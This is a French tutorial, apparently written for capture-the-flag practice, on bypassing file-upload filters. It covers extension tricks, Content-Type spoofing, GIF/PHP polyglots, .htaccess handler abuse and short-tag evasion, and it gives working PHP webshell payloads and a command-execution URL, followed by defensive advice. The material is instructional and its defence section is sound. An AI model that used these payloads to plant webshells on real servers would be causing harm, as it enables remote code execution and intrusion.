# Contournement d'upload de fichiers

Un formulaire d'upload n'est dangereux que si tu peux y déposer quelque chose
qui s'exécute. Le but : faire passer un fichier que le serveur va *exécuter* (un
webshell) à travers les contrôles en place. Donc d'abord, comprendre ce qui est
vraiment vérifié, puis défaire cette couche.

Tous les exemples sont génériques. Rien ici n'est la solution d'un challenge
précis.

## 1. Ce qui est vérifié

En général un ou plusieurs de :

- **extension** — allow/deny-list côté client ou serveur
- **Content-Type** (MIME) — l'en-tête envoyé par le navigateur
- **magic bytes** — les premiers octets du fichier (ex. `GIF89a`, `\xFF\xD8`
  pour un JPEG)
- **contenu** — une recherche de `<?php`, ou un ré-encodage d'image
- **taille**, nom de fichier, parfois dimensions

Chacun est une couche séparée à contourner. Upload d'abord une vraie image et
observe la requête/réponse dans Burp pour voir ce qui passe.

## 2. Astuces d'extension

Quand le filtre porte sur l'extension :

- **double extension** — `shell.php.jpg`, ou `shell.jpg.php` si seule la
  dernière est vérifiée.
- **extensions PHP alternatives** — `.phtml`, `.php3`, `.php4`, `.php5`,
  `.php7`, `.pht`, `.phar`. Une deny-list qui ne bloque que `.php` les rate.
- **casse** — `shell.PhP` contre une deny-list sensible à la casse.
- **caractère final** — `shell.php.` ou `shell.php%20` / `shell.php%00` (null
  byte, vieilles stacks) quand le suffixe est coupé après le contrôle.

L'extension alternative ne sert que si le serveur est configuré pour l'exécuter,
donc teste-en plusieurs.

## 3. MIME / Content-Type

S'il ne fait confiance qu'à l'en-tête `Content-Type`, il suffit de mentir. Garde
ton corps `.php` et mets :

```
Content-Type: image/jpeg
```

Ça se fait dans Burp en éditant l'en-tête de la partie multipart.

## 4. Magic bytes & polyglots

Si le serveur vérifie les premiers octets (ou utilise `getimagesize`), fais un
fichier qui *ressemble* à une image mais contient quand même du code :

```
GIF89a;
<?php system($_GET[0]); ?>
```

`GIF89a` satisfait le contrôle image ; PHP ignore le texte en tête et exécute le
code — un polyglot GIF/PHP. Pareil dans le commentaire/EXIF d'un vrai JPEG.

## 5. L'astuce .htaccess

Si `.php` est bloqué mais que tu peux uploader des fichiers quelconques dans un
dossier servi par Apache, upload un `.htaccess` qui fait exécuter une extension
anodine comme du PHP :

```
# .htaccess
AddType application/x-httpd-php .xyz
```

Puis upload `shell.xyz` — il s'exécute maintenant comme du PHP.

## 6. Filtres de contenu

Si le contenu est scanné à la recherche de `<?php` :

- balises courtes : `<?=system($_GET[0]);?>`
- `<script language="php">system($_GET[0]);</script>` sur du vieux PHP
- casse la chaîne pour qu'un grep naïf la rate.

## 7. De l'upload au RCE

Trouver où le fichier a atterri, c'est la moitié du boulot : cherche un chemin
dans la réponse, devine `/uploads/`, ou lis le source (via LFI) pour trouver le
dossier de sauvegarde. Puis appelle ton shell :

```
/uploads/shell.php?0=id
```

## 8. Se défendre

- **Whitelister** les extensions, et valider le vrai contenu côté serveur
  (`finfo`/`getimagesize`), pas le Content-Type du client.
- **Renommer** les uploads avec un nom aléatoire et une extension sûre fixe.
- **Stocker hors de la racine web**, ou dans un dossier où l'exécution est
  désactivée (`php_admin_flag engine off`, pas de handler), et bloquer les
  `.htaccess`.
- **Ré-encoder les images** pour détruire tout code embarqué.

---

Fait par **White** · [github.com/white-exee](https://github.com/white-exee)
